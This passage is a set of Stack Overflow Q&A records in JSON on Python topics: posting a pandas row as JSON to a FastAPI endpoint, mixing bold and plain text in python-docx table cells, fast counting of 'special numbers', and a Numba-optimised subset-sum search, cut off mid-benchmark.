float\nRPPA_MAP2K1_MEK1 : float\nRPPA_CASP8 : float\nRPPA_PAI : float\nRPPA_CHEK1 : float\nRPPA_STK11 : float\nRPPA_AKT1S1 : float\nRPPA_WWTR1 : float\nRPPA_CDKN1A : float\nRPPA_KDR : float\nRPPA_CHEK2_2 : float\nRPPA_EGFR_pY1173 : float\nRPPA_EGFR_pY992 : float\nRPPA_IGF1R : float\nRPPA_YWHAE : float\nRPPA_RPS6KA1 : float\nRPPA_TSC2 : float\nRPPA_CDC2 : float\nRPPA_EEF2 : float\nRPPA_NCOA3 : float\nRPPA_FRAP1 : float\nRPPA_AR : float\nRPPA_GAB2 : float\nRPPA_YBX1 : float\nRPPA_ESR1 : float\nRPPA_RAD51 : float\nRPPA_SMAD4 : float\nRPPA_CDH3 : float\nRPPA_CDH2 : float\nRPPA_FOXO3 : float\nRPPA_ERBB2_HER : float\nRPPA_BECN1 : float\nRPPA_CASP9 : float\nRPPA_SETD2 : float\nRPPA_SRC_Src_mv : float\nRPPA_GSK3A_alpha : float\nRPPA_YAP1_pS127 : float\nRPPA_PRKCA_alpha : float\nRPPA_PRKAA1 : float\nRPPA_RAF1_pS338 : float\nRPPA_MYC : float\nRPPA_PRKAA1_AMPK : float\nRPPA_ERRFI1_MIG : float\nRPPA_EIF4EBP1_2 : float\nRPPA_STAT3 : float\nRPPA_AKT1_AKT2_AKT3 : float\nRPPA_NF2 : float\nRPPA_PECAM1 : float\nRPPA_BAK1 : float\nRPPA_IRS1 : float\nRPPA_PTK2 : float\nRPPA_ERBB3_2 : float\nRPPA_FOXO3_a : float\nRPPA_RB1_Rb : float\nRPPA_MAPK14_p38 : float\nRPPA_NFKB1 : float\nRPPA_CHEK1_Chk1 : float\nRPPA_LCK : float\nRPPA_XRCC5 : float\nRPPA_PARK7 : float\nRPPA_DIABLO : float\nRPPA_CTNNA1 : float\nRPPA_ESR1_ER : float\nRPPA_IGFBP2 : float\nRPPA_STMN1 : float\nRPPA_WWTR1_TAZ : float\nRPPA_CASP3 : float\nRPPA_JUN : float\nRPPA_CCNB1 : float\nRPPA_CLDN7 : float\nRPPA_PXN : float\nRPPA_RPS6KB1_p : float\nRPPA_KIT : float\nRPPA_CAV1 : float\nRPPA_PTEN : float\nRPPA_BAX : float\nRPPA_SMAD3 : float\nRPPA_ERBB2 : float\nRPPA_MET_c : float\nRPPA_ERCC1 : float\nRPPA_MAPK14 : float\nRPPA_BIRC2 : float\nRPPA_PIK3R1 : float\nRPPA_BCL2 : float\nRPPA_PEA : float\nRPPA_EEF2K : float\nRPPA_RPS6KB1_p70 : float\nRPPA_MRE11A : float\nRPPA_KRAS : float\nRPPA_ARID1A : float\nRPPA_YBX1_yb : float\nRPPA_NOTCH3 : float\nRPPA_EIF4EBP1_3 : float\nRPPA_XRCC1 : float\nRPPA_ANXA1 : float\nRPPA_CD49 : float\nRPPA_SHC1 : float\nRPPA_PDK1 : float\nRPPA_EIF4E : float\nRPPA_MAPK1_MAPK3 : float\nRPPA_PTGS2 : float\nRPPA_PRKCA : float\nRPPA_EGFR_egfr : float\nRPPA_RAB25 : float\nRPPA_RB1 : float\nRPPA_MAPK1 : float\nRPPA_TFF1 : float\n    \nclass config:\n    orm_mode = True\n        \n@app.post(\"/prediction/\")\nasync def create_item(userdata: Userdata):\n    df = pd.DataFrame(userdata)\n    y = model.predict(df)\n    y = [0 if val < 0.5 else 1 for val in y]\n    if y == 1:\n        survival = 'You will survive.'\n    if y == 0:\n        survival = 'You will not survive.'\n    return {'Prediction': survival}\n\n",
    "AcceptedAnswerId": 71471293,
    "AcceptedAnswer": "In Python requests, when sending JSON data using the json parameter, you need to pass a dict object (e.g., json={\"RPPA_HSPA1A\":30,\"RPPA_XIAP\":-0.902044768}), which requests will automatically encode into JSON and set the Content-Type header to application/json. In your case, however, as you are using  to_json() method, the object you get (i.e., df_json as you define it) is a JSON encoded string (you could verify that by printing out type(df_json)). Thus, you should rather use to_dict() method, which returns a dictionary instead. Since you are using orient='records', the returned object will be a list of dict, and thus, you need to get the first element from that list. Example below:\ndata = dataframe.to_dict(orient='records')\npayload = data[0]\nprediction = requests.post('', json=payload)\n\nOtherwise, if you used to_json() method, you would need to use the data parameter when posting the request (see the documentation here), and as mentioned earlier, since you specify the orientation to records that returns a list, you would need to strip both the leading and trailing square brackets from that string. Also, using this method, you would need to manually set the Content-Type header to application/json. Example below:\ndf_json = dataframe.to_json(orient='records')\npayload = df_json.strip(\"[]\")\nprediction = requests.post('', data=payload, headers={\"Content-Type\": \"application/json\"})\n\n"
}
{
    "Id": 71150313,
    "PostTypeId": 1,
    "Title": "python-docx adding bold and non-bold strings to same cell in table",
    "Body": "I'm using python-docx to create a document with a table I want to populate from textual data. My text looks like this:\n01:02:10.3 \na: Lorem ipsum dolor sit amet,  \nb: consectetur adipiscing elit.\na: Mauris a turpis erat. \n01:02:20.4 \na: Vivamus dignissim aliquam\nb: Nam ultricies\n(etc.)\n\nI need to organize it in a table like this (using ASCII for visualization):\n+---+--------------------+---------------------------------+\n|   |         A          |                B                |\n+---+--------------------+---------------------------------+\n| 1 | 01:02:10.3         | a: Lorem ipsum dolor sit amet,  |\n| 2 |                    | b: consectetur adipiscing elit. |\n| 3 |                    | a: Mauris a turpis erat.        |\n| 4 | ------------------ | ------------------------------- |\n| 5 | 01:02:20.4         | a: Vivamus dignissim aliqua     |\n| 6 |                    | b: Nam ultricies                |\n+---+--------------------+---------------------------------+\n\nhowever, I need to make it so everything after \"a: \" is bold, and everything after \"b: \" isn't, while they both occupy the same cell. It's pretty easy to iterate and organize this the way I want, but I'm really unsure about how to make only some of the lines bold:\nIS_BOLD = { \n    'a': True\n    'b': False\n}\n\nrow_cells = table.add_row().cells\n\nfor line in lines: \n    if is_timestamp(line): # function that uses regex to discern between columns\n        if row_cells[1]:\n            row_cells = table.add_row().cells\n\n        row_cells[0].text = line\n\n    else \n        row_cells[1].text += line\n\n        if IS_BOLD[ line.split(\":\")[0] ]:\n            # make only this line within the cell bold, somehow.\n\n(this is sort of pseudo-code, I'm doing some more textual processing but that's kinda irrelevant here). I found one probably relevant question where someone uses something called run but I'm finding it hard to understand how to apply it to my case.\nAny help?\nThanks.\n",
    "AcceptedAnswerId": 71280321,
    "AcceptedAnswer": "You need to add run in the cell's paragraph. This way you can control the specific text you wish to bold\nFull example:\nfrom docx import Document\nfrom docx.shared import Inches\nimport os\nimport re\n\n\ndef is_timestamp(line):\n    # it's flaky, I saw you have your own method and probably you did a better job parsing this.\n    return re.match(r'^\\d{2}:\\d{2}:\\d{2}', line) is not None\n\n\ndef parse_raw_script(raw_script):\n    current_timestamp = ''\n    current_content = ''\n    for line in raw_script.splitlines():\n        line = line.strip()\n        if is_timestamp(line):\n            if current_timestamp:\n                yield {\n                    'timestamp': current_timestamp,\n                    'content': current_content\n                }\n\n            current_timestamp = line\n            current_content = ''\n            continue\n\n        if current_content:\n            current_content += '\\n'\n\n        current_content += line\n\n    if current_timestamp:\n        yield {\n            'timestamp': current_timestamp,\n            'content': current_content\n        }\n\n\ndef should_bold(line):\n    # i leave it to you to replace with your logic\n    return line.startswith('a:')\n\n\ndef load_raw_script():\n    # I placed here the example from your question. read from file instead I presume\n\n    return '''01:02:10.3 \na: Lorem ipsum dolor sit amet,  \nb: consectetur adipiscing elit.\na: Mauris a turpis erat. \n01:02:20.4 \na: Vivamus dignissim aliquam\nb: Nam ultricies'''\n\n\ndef convert_raw_script_to_docx(raw_script, output_file_path):\n    document = Document()\n    table = document.add_table(rows=1, cols=3, style=\"Table Grid\")\n\n    # add header row\n    header_row = table.rows[0]\n    header_row.cells[0].text = ''\n    header_row.cells[1].text = 'A'\n    header_row.cells[2].text = 'B'\n\n    # parse the raw script into something iterable\n    script_rows = parse_raw_script(raw_script)\n\n    # create a row for each timestamp row\n    for script_row in script_rows:\n        timestamp = script_row['timestamp']\n        content = script_row['content']\n\n        row = table.add_row()\n        timestamp_cell = row.cells[1]\n        timestamp_cell.text = timestamp\n\n        content_cell = row.cells[2]\n        content_paragraph = content_cell.paragraphs[0]  # using the cell's default paragraph here instead of creating one\n\n        for line in content.splitlines():\n            run = content_paragraph.add_run(line)\n            if should_bold(line):\n                run.bold = True\n\n            run.add_break()\n\n    # resize table columns (optional)\n    for row in table.rows:\n        row.cells[0].width = Inches(0.2)\n        row.cells[1].width = Inches(1.9)\n        row.cells[2].width = Inches(3.9)\n\n    document.save(output_file_path)\n\n\ndef main():\n    script_dir = os.path.dirname(__file__)\n    dist_dir = os.path.join(script_dir, 'dist')\n\n    if not os.path.isdir(dist_dir):\n        os.makedirs(dist_dir)\n\n    output_file_path = os.path.join(dist_dir, 'so-template.docx')\n    raw_script = load_raw_script()\n    convert_raw_script_to_docx(raw_script, output_file_path)\n\n\nif __name__ == '__main__':\n    main()\n\n\nResult (file should be in ./dist/so-template.docx):\n\n\nBTW - if you prefer sticking with your own example, this is what needs to be changed:\nIS_BOLD = {\n    'a': True,\n    'b': False\n}\n\nrow_cells = table.add_row().cells\n\nfor line in lines:\n    if is_timestamp(line):\n        if row_cells[1]:\n            row_cells = table.add_row().cells\n        row_cells[0].text = line\n\n    else:\n        run = row_cells[1].paragraphs[0].add_run(line)\n        if IS_BOLD[line.split(\":\")[0]]:\n            run.bold = True\n\n        run.add_break()\n\n"
}
{
    "Id": 71370656,
    "PostTypeId": 1,
    "Title": "Special Number Count",
    "Body": "It is a number whose gcd of (sum of quartic power of its digits, the product of its digits) is more than 1.\neg.\n123 is a special number because hcf of(1+16+81, 6) is more than 1.\nI have to find the count of all these numbers that are below input n.\neg.\nfor n=120 their are 57 special numbers between (1 and 120)\nI have done a code but its very slow can you please tell me to do it in some good and fast way.\nIs there is any way to do it using some maths.\nimport math,numpy\nt = int(input())\n\nans = []\n\nfor i in range(0,t):\n    ans.append(0)\n    n = int(input())\n    for j in range(1, n+1):\n        res = math.gcd(sum([pow(int(k),4) for k in str(j)]),numpy.prod([int(k) for k in str(j)]))\n        if res>1:\n            ans[i] = ans[i] + 1\n\nfor i in range(0,t):\n    print(ans[i])\n\n",
    "AcceptedAnswerId": 71402821,
    "AcceptedAnswer": "Here's an O(log n) algorithm for actually counting special numbers less than or equal to n. It builds digit strings one at a time, keeping track of whether 2, 3, 5 and 7 divide that digit string's product, and the remainder modulo 2, 3, 5, and 7 of the sum of fourth powers of those digits.\nThe logic for testing whether a number is special based on divisibility by those prime factors and remainder of powers under those factors is the same as in David's answer, and is explained better there. Since there are only 2^4 possibilities for which primes divide the product, and 2*3*5*7 possibilities for the remainder, there are a constant number of combinations of both that are possible, for a runtime of O(2^4 * 210 * log n) = O(log n).\ndef count_special_less_equal(digits: List[int]) -> int:\n    \"\"\"Return the count of numbers less than or equal to the represented\n    number, with the property that\n    gcd(product(digits), sum(fourth powers of digits)) > 1\"\"\"\n\n    # Count all digit strings with zeroes\n    total_non_special = len(digits)\n\n    primes = (2, 3, 5, 7)\n    prime_product = functools.reduce(operator.mul, primes, 1)\n\n    digit_to_remainders = [pow(x, 4, prime_product) for x in range(10)]\n\n    # Map each digit 1-9 to prime factors\n    # 2: 2**0, 3: 2**1, 5: 2**2, 7: 2**3\n    factor_masks = [0, 0, 1, 2, 1, 4, 3, 8, 1, 2]\n\n    def is_fac_mask_mod_special(factor_mask: int,\n                                remainder: int) -> bool:\n        \"\"\"Return true if any of the prime factors represented in factor_mask\n        have corresponding remainder 0 (i.e., divide the sum of fourth powers)\"\"\"\n\n        return any((factor_mask & (1 << i) != 0\n                    and remainder % primes[i] == 0)\n                   for i in range(4))\n\n    prefix_less_than = [Counter() for _ in range(16)]\n\n    # Empty string\n    prefix_equal = (0, 0)\n\n    for digit_pos, digit in enumerate(digits):\n\n        new_prefix_less_than = [Counter() for _ in range(16)]\n\n        # Old \"lesser than\" prefixes stay lesser\n        for fac_mask, fac_mask_counts in enumerate(prefix_less_than):\n            for new_digit in range(1, 10):\n                new_mask = fac_mask | factor_masks[new_digit]\n                remainder_change = digit_to_remainders[new_digit]\n                for old_remainder, old_count in fac_mask_counts.items():\n                    new_remainder = (remainder_change + old_remainder) % prime_product\n                    new_prefix_less_than[new_mask][new_remainder] += old_count\n\n        if digit == 0:\n            prefix_equal = None\n\n        if prefix_equal is not None:\n            equal_fac_mask, equal_remainder = prefix_equal\n            for new_digit in range(1, digit):\n\n                new_mask = equal_fac_mask | factor_masks[new_digit]\n\n                remainder_change = digit_to_remainders[new_digit]\n                new_remainder = (remainder_change + equal_remainder) % prime_product\n\n                new_prefix_less_than[new_mask][new_remainder] += 1\n\n            new_mask = equal_fac_mask | factor_masks[digit]\n            remainder_change = digit_to_remainders[digit]\n\n            new_remainder = (remainder_change + equal_remainder) % prime_product\n            prefix_equal = (new_mask, new_remainder)\n\n        prefix_less_than = new_prefix_less_than\n\n        if digit_pos == len(digits) - 1:\n            break\n\n        # Empty string\n        prefix_less_than[0][0] += 1\n\n    for fac_mask, fac_mask_counts in enumerate(prefix_less_than):\n        for remainder, rem_count in fac_mask_counts.items():\n            if not is_fac_mask_mod_special(factor_mask=fac_mask,\n                                           remainder=remainder):\n                total_non_special += rem_count\n\n    if prefix_equal is not None:\n        if not is_fac_mask_mod_special(*prefix_equal):\n            total_non_special += 1\n\n    return 1 + int(''.join(map(str, digits))) - total_non_special\n\nExample usage:\nprint(f\"{count_special_less_equal(digits_of(120))}\")\n\nprints\n57\n\nand\nfor exponent in range(1, 19):\n    print(f\"Count up to 10^{exponent}: {count_special_less_equal(digits_of(10**exponent))}\")\n\ngives:\nCount up to 10^1: 8\nCount up to 10^2: 42\nCount up to 10^3: 592\nCount up to 10^4: 7400\nCount up to 10^5: 79118\nCount up to 10^6: 854190\nCount up to 10^7: 8595966\nCount up to 10^8: 86010590\nCount up to 10^9: 866103492\nCount up to 10^10: 8811619132\nCount up to 10^11: 92967009216\nCount up to 10^12: 929455398976\nCount up to 10^13: 9268803096820\nCount up to 10^14: 92838342330554\nCount up to 10^15: 933105194955392\nCount up to 10^16: 9557298732021784\nCount up to 10^17: 96089228976983058\nCount up to 10^18: 960712913414545906\n\nDone in 0.3783 seconds\n\nThis finds the frequencies for all powers of 10 up to 10^18 in about a third of a second. It's possible to optimize this further in the constant factors, using numpy arrays or other tricks (like precomputing the counts for all numbers with a fixed number of digits).\n"
}
{
    "Id": 71527595,
    "PostTypeId": 1,
    "Title": "Efficiently count all the combinations of numbers having a sum close to 0",
    "Body": "I have following pandas dataframe\ndf\ncolumn1 column2 list_numbers          sublist_column\nx        y      [10,-6,1,-4]             \na        b      [1,3,7,-2]               \np        q      [6,2,-3,-3.2]             \n\nthe sublist_column will contain the numbers from the column \"list_numbers\" that adds up to 0 (0.5 is a tolerance)\nI have written following code.\ndef return_list(original_lst,target_sum,tolerance):\n    memo=dict()\n    sublist=[]\n    for i, x in enumerate(original_lst):\n    \n        if memo_func(original_lst, i + 1, target_sum - x, memo,tolerance) > 0:\n            sublist.append(x)\n            target_sum -= x          \n    return sublist  \n\ndef memo_func(original_lst, i, target_sum, memo,tolerance):\n    \n    if i >= len(original_lst):\n        if target_sum =-tolerance:\n            return 1\n        else:\n            return 0\n    if (i, target_sum) not in memo:  \n        c = memo_func(original_lst, i + 1, target_sum, memo,tolerance)\n        c += memo_func(original_lst, i + 1, target_sum - original_lst[i], memo,tolerance)\n        memo[(i, target_sum)] = c  \n    return memo[(i, target_sum)]    \n    \n\nThen I am using the \"return_list\" function on the \"sublist_column\" to populate the result.\ntarget_sum = 0\ntolerance=0.5\n\ndf['sublist_column']=df['list_numbers'].apply(lambda x: return_list(x,0,tolerance))\n\nthe following will be the resultant dataframe\ncolumn1 column2 list_numbers          sublist_column\nx        y      [10,-6,1,-4]             [10,-6,-4]\na        b      [1,3,7,-2]               []\np        q      [6,2,-3,-3.2]            [6,-3,-3.2]  #sum is -0.2(within the tolerance)\n\nThis is giving me correct result but it's very slow(takes 2 hrs to run if i use spyder IDE), as my dataframe size has roughly 50,000 rows, and the length of some of the lists in the \"list_numbers\" column is more than 15.\nThe running time is particularly getting affected when the number of elements in the lists in the \"list_numbers\" column is greater than 15.\ne.g following list is taking almost 15 minutes to process\n[-1572.35,-76.16,-261.1,-7732.0,-1634.0,-52082.42,-3974.15,\n-801.65,-30192.79,-671.98,-73.06,-47.72,57.96,-511.18,-391.87,-4145.0,-1008.61,\n-17.53,-17.53,-1471.08,-119.26,-2269.7,-2709,-182939.59,-19.48,-516,-6875.75,-138770.16,-71.11,-295.84,-348.09,-3460.71,-704.01,-678,-632.15,-21478.76]\n\nHow can i significantly improve my running time?\n",
    "AcceptedAnswerId": 71551035,
    "AcceptedAnswer": "Step 1: using Numba\nBased on the comments, it appear that memo_func is the main bottleneck. You can use Numba to speed up its execution. Numba compile the Python code to a native one thanks to a just-in-time (JIT) compiler. The JIT is able to perform tail-call optimizations and native function calls are significantly faster than the one of CPython. Here is an example:\nimport numba as nb\n\n@nb.njit('(float64[::1], int64, float64, float64)')\ndef memo_func(original_arr, i, target_sum, tolerance):\n    if i >= len(original_arr):\n        if -tolerance <= target_sum <= tolerance:\n            return 1\n        return 0\n    c = memo_func(original_arr, i + 1, target_sum, tolerance)\n    c += memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)\n    return c\n\n@nb.njit('(float64[::1], float64, float64)')\ndef return_list(original_arr, target_sum, tolerance):\n    sublist = []\n    for i, x in enumerate(original_arr):\n        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance) > 0:\n            sublist.append(x)\n            target_sum -= x\n    return sublist\n\nUsing memoization does not seems to speed up the result and this is a bit cumbersome to implement in Numba. In fact, there are much better ways to improve the algorithm.\nNote that you need to convert the lists in Numpy array before calling the functions:\nlst = [-850.85,-856.05,-734.09,5549.63,77.59,-39.73,23.63,13.93,-6455.54,-417.07,176.72,-570.41,3621.89,-233.47,-471.54,-30.33,-941.49,-1014.6,1614.5]\nresult = return_list(np.array(lst, np.float64), 0, tolerance)\n\n\nStep 2: tail call optimization\nCalling many function to compute the right part of the input list is not efficient. The JIT is able to reduce the number of all but it is not able to completely remove them. You can unroll all the call when the depth of the tail calls is big. For example, when there is 6 items to compute, you can use this following code:\nif n-i == 6:\n    c = 0\n    s0 = target_sum\n    v0, v1, v2, v3, v4, v5 = original_arr[i:]\n    for s1 in (s0, s0 - v0):\n        for s2 in (s1, s1 - v1):\n            for s3 in (s2, s2 - v2):\n                for s4 in (s3, s3 - v3):\n                    for s5 in (s4, s4 - v4):\n                        for s6 in (s5, s5 - v5):\n                            c += np.int64(-tolerance <= s6 <= tolerance)\n    return c\n\nThis is pretty ugly but far more efficient since the JIT is able to unroll all the loop and produce a very fast code. Still, this is not enough for large lists.\n\nStep 3: better algorithm\nFor large input lists, the problem is the exponential complexity of the algorithm. The thing is this problem looks really like a relaxed variant of subset-sum which is known to be NP-complete. Such class of algorithm is known to be very hard to solve. The best exact practical algorithms known so far to solve NP-complete problem are exponential. Put it shortly, this means that for any sufficiently large input, there is no known algorithm capable of finding an exact solution in a reasonable time (eg. less than the lifetime of a human).\nThat being said, there are heuristics and strategies to improve the complexity of the current algorithm. One efficient approach is to use a meet-in-the-middle algorithm. When applied to your use-case, the idea is to generate a large set of target sums, then sort them, and then use a binary search to find the number of matching values. This is possible here since -tolerance  where target_sum = partial_sum1 + partial_sum2 is equivalent to -tolerance + partial_sum2 .\nThe resulting code is unfortunately quite big and not trivial, but this is certainly the cost to pay for trying to solve efficiently a complex problem like this one. Here it is:\n# Generate all the target sums based on in_arr and put the result in out_sum\n@nb.njit('(float64[::1], float64[::1], float64)', cache=True)\ndef gen_all_comb(in_arr, out_sum, target_sum):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        assert out_sum.size == 64\n        v0, v1, v2, v3, v4, v5 = in_arr\n        s0 = target_sum\n        cur = 0\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                out_sum[cur] = s6\n                                cur += 1\n    else:\n        assert out_sum.size % 2 == 0\n        mid = out_sum.size // 2\n        gen_all_comb(in_arr[1:], out_sum[:mid], target_sum)\n        gen_all_comb(in_arr[1:], out_sum[mid:], target_sum - in_arr[0])\n\n# Find the number of item in sorted_arr where:\n# lower_bound <= item <= upper_bound\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef count_between(sorted_arr, lower_bound, upper_bound):\n    assert lower_bound <= upper_bound\n    lo_pos = np.searchsorted(sorted_arr, lower_bound, side='left')\n    hi_pos = np.searchsorted(sorted_arr, upper_bound, side='right')\n    return hi_pos - lo_pos\n\n# Count all the target sums in:\n# -tolerance <= all_target_sums(in_arr,sorted_target_sums)-s0 <= tolerance\n@nb.njit('(float64[::1], float64[::1], float64, float64)', cache=True)\ndef multi_search(in_arr, sorted_target_sums, tolerance, s0):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        v0, v1, v2, v3, v4, v5 = in_arr\n        c = 0\n        for s1 in (s0, s0 + v0):\n            for s2 in (s1, s1 + v1):\n                for s3 in (s2, s2 + v2):\n                    for s4 in (s3, s3 + v3):\n                        for s5 in (s4, s4 + v4):\n                            for s6 in (s5, s5 + v5):\n                                lo = -tolerance + s6\n                                hi = tolerance + s6\n                                c += count_between(sorted_target_sums, lo, hi)\n        return c\n    else:\n        c = multi_search(in_arr[1:], sorted_target_sums, tolerance, s0)\n        c += multi_search(in_arr[1:], sorted_target_sums, tolerance, s0 + in_arr[0])\n        return c\n\n@nb.njit('(float64[::1], int64, float64, float64)', cache=True)\ndef memo_func(original_arr, i, target_sum, tolerance):\n    n = original_arr.size\n    remaining = n - i\n    tail_size = min(max(remaining//2, 7), 16)\n\n    # Tail call: for very small list (trivial case)\n    if remaining <= 0:\n        return np.int64(-tolerance <= target_sum <= tolerance)\n\n    # Tail call: for big lists (better algorithm)\n    elif remaining >= tail_size*2:\n        partial_sums = np.empty(2**tail_size, dtype=np.float64)\n        gen_all_comb(original_arr[-tail_size:], partial_sums, target_sum)\n        partial_sums.sort()\n        return multi_search(original_arr[-remaining:-tail_size], partial_sums, tolerance, 0.0)\n\n    # Tail call: for medium-sized list (unrolling)\n    elif remaining == 6:\n        c = 0\n        s0 = target_sum\n        v0, v1, v2, v3, v4, v5 = original_arr[i:]\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                c += np.int64(-tolerance <= s6 <= tolerance)\n        return c\n\n    # Recursion\n    c = memo_func(original_arr, i + 1, target_sum, tolerance)\n    c += memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)\n    return c\n\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef return_list(original_arr, target_sum, tolerance):\n    sublist = []\n    for i, x in enumerate(original_arr):\n        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance) > 0:\n            sublist.append(x)\n            target_sum -= x\n    return sublist\n\nNote that the code takes few seconds to compile since it is quite big. The cache should help not to recompile it every time.\n\nStep 4: even better algorithm\nThe previous code count the number of matching values (the value stored in c). This is not needed since we just want to know if 1 value exists (ie. memo_func(...) > 0). As a result, we can return a boolean to define if a value has been found and optimize the algorithm so to directly return True when some early solutions are found. Big parts of the exploration tree can be skipped with this method (which is particularly efficient when there are many possible solutions like on random arrays).\nAnother optimization is then to perform only one binary search (instead of two) and check before if the searched values can be found in the min-max range of the sorted array (so to skip this trivial case before applying the expensive binary search). This is possible because of the previous optimization.\nA final optimization is to early discard a part the exploration tree when the values generated by multi_search are so small/big that we can be sure there is no need to perform a binary search. This can be done by computing a pessimistic over-approximation of the searched values. This is especially useful in pathological cases that have almost no solutions.\nHere is the final implementation:\n@nb.njit('(float64[::1], float64[::1], float64)', cache=True)\ndef gen_all_comb(in_arr, out_sum, target_sum):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        assert out_sum.size == 64\n        v0, v1, v2, v3, v4, v5 = in_arr\n        s0 = target_sum\n        cur = 0\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                out_sum[cur] = s6\n                                cur += 1\n    else:\n        assert out_sum.size % 2 == 0\n        mid = out_sum.size // 2\n        gen_all_comb(in_arr[1:], out_sum[:mid], target_sum)\n        gen_all_comb(in_arr[1:], out_sum[mid:], target_sum - in_arr[0])\n\n# Find the number of item in sorted_arr where:\n# lower_bound <= item <= upper_bound\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef has_items_between(sorted_arr, lower_bound, upper_bound):\n    if upper_bound < sorted_arr[0] or sorted_arr[sorted_arr.size-1] < lower_bound:\n        return False\n    lo_pos = np.searchsorted(sorted_arr, lower_bound, side='left')\n    return lo_pos < sorted_arr.size and sorted_arr[lo_pos] <= upper_bound\n\n# Count all the target sums in:\n# -tolerance <= all_target_sums(in_arr,sorted_target_sums)-s0 <= tolerance\n@nb.njit('(float64[::1], float64[::1], float64, float64)', cache=True)\ndef multi_search(in_arr, sorted_target_sums, tolerance, s0):\n    assert in_arr.size >= 6\n    if in_arr.size == 6:\n        v0, v1, v2, v3, v4, v5 = in_arr\n        x3, x4, x5 = min(v3, 0), min(v4, 0), min(v5, 0)\n        y3, y4, y5 = max(v3, 0), max(v4, 0), max(v5, 0)\n        mini = sorted_target_sums[0]\n        maxi = sorted_target_sums[sorted_target_sums.size-1]\n\n        for s1 in (s0, s0 + v0):\n            for s2 in (s1, s1 + v1):\n                for s3 in (s2, s2 + v2):\n                    # Prune the exploration tree early if a \n                    # larger range cannot be found.\n                    lo = s3 + (x3 + x4 + x5 - tolerance)\n                    hi = s3 + (y3 + y4 + y5 + tolerance)\n                    if hi < mini or maxi < lo:\n                        continue\n\n                    for s4 in (s3, s3 + v3):\n                        for s5 in (s4, s4 + v4):\n                            for s6 in (s5, s5 + v5):\n                                lo = -tolerance + s6\n                                hi = tolerance + s6\n                                if has_items_between(sorted_target_sums, lo, hi):\n                                    return True\n        return False\n    return (\n        multi_search(in_arr[1:], sorted_target_sums, tolerance, s0)\n        or multi_search(in_arr[1:], sorted_target_sums, tolerance, s0 + in_arr[0])\n    )\n\n@nb.njit('(float64[::1], int64, float64, float64)', cache=True)\ndef memo_func(original_arr, i, target_sum, tolerance):\n    n = original_arr.size\n    remaining = n - i\n    tail_size = min(max(remaining//2, 7), 13)\n\n    # Tail call: for very small list (trivial case)\n    if remaining <= 0:\n        return -tolerance <= target_sum <= tolerance\n\n    # Tail call: for big lists (better algorithm)\n    elif remaining >= tail_size*2:\n        partial_sums = np.empty(2**tail_size, dtype=np.float64)\n        gen_all_comb(original_arr[-tail_size:], partial_sums, target_sum)\n        partial_sums.sort()\n        return multi_search(original_arr[-remaining:-tail_size], partial_sums, tolerance, 0.0)\n\n    # Tail call: for medium-sized list (unrolling)\n    elif remaining == 6:\n        s0 = target_sum\n        v0, v1, v2, v3, v4, v5 = original_arr[i:]\n        for s1 in (s0, s0 - v0):\n            for s2 in (s1, s1 - v1):\n                for s3 in (s2, s2 - v2):\n                    for s4 in (s3, s3 - v3):\n                        for s5 in (s4, s4 - v4):\n                            for s6 in (s5, s5 - v5):\n                                if -tolerance <= s6 <= tolerance:\n                                    return True\n        return False\n\n    # Recursion\n    return (\n        memo_func(original_arr, i + 1, target_sum, tolerance)\n        or memo_func(original_arr, i + 1, target_sum - original_arr[i], tolerance)\n    )\n\n@nb.njit('(float64[::1], float64, float64)', cache=True)\ndef return_list(original_arr, target_sum, tolerance):\n    sublist = []\n    for i, x in enumerate(original_arr):\n        if memo_func(original_arr, np.int64(i + 1), target_sum - x,tolerance):\n            sublist.append(x)\n            target_sum -= x\n    return sublist\n\nThis final implementation is meant to efficiently compute pathological cases (the one where there is only few non-trivial solutions or even no solutions like on the big provided input lists). However, it can can be tuned so to compute faster the cases where there are many solutions (like on large random uniformly-distributed arrays) at the expense of a significantly slower execution on the pathological cases. This tread-off can be set by changing the variable tail_size (smaller values are better for cases with more solutions).\n\nBenchmark\nHere is the tested inputs:\ntarget_sum = 0\ntolerance = 0.5\n\nsmall_lst = [-850.85,-856.05,-734.09,5549.63,77.59,-39.73,23.63,13.93,-6455.54,-417.07,176.72,-570.41,3621.89,-233.47,-471.54,-30.33,-941.49,-1014.6,1614.5]\nbig_lst = [-1572.35,-76.16,-261.1,-7732.0,-1634.0,-52082.42,-3974.15,-801.65,-30192.79,-671.98,-73.06,-47.72,57.96,-511.18,-391.87,-4145.0,-1008.61,-17.53,-17.53,-1471.08,-119.26,-2269.7,-2709,-182939.59,-19.48,-516,-6875.75,-138770.16,-71.11,-295.84,-348.09,-3460.71,-704.01,-678,-632.15,-21478.76]\nrandom_lst = [-86145.13, -34783.33, 50912.99, -87823.73, 37537.52, -22796.4, 53530.74, 65477.91, -50725.36, -52609.35, 92769.95, 83630.42, 30436.95, -24347.08, -58197.95, 77504.44, 83958.08, -85095.73, -61347.26, -14250.65, 2012.91, 83969.32, -69356.41, 29659.23, 94736.29, 2237.82, -17784.34, 23079.36, 8059.84, 26751.26, 98427.46, -88735.07, -28936.62, 21868.77, 5713.05, -74346.18]\n\nThe uniformly-distributed random list has a very large number of solutions while the provided big list has none. The tuned final implementation set tail_size to min(max(remaining//2, 7), 13) so to compute the random list much faster at the expense of a significantly slower execution on the big list.\n\nHere is the timing with the small list on my machine:\nNaive python algorithm:               173.45 ms\nNaive algorithm using Numba:            7.21 ms\nTail call optimization + 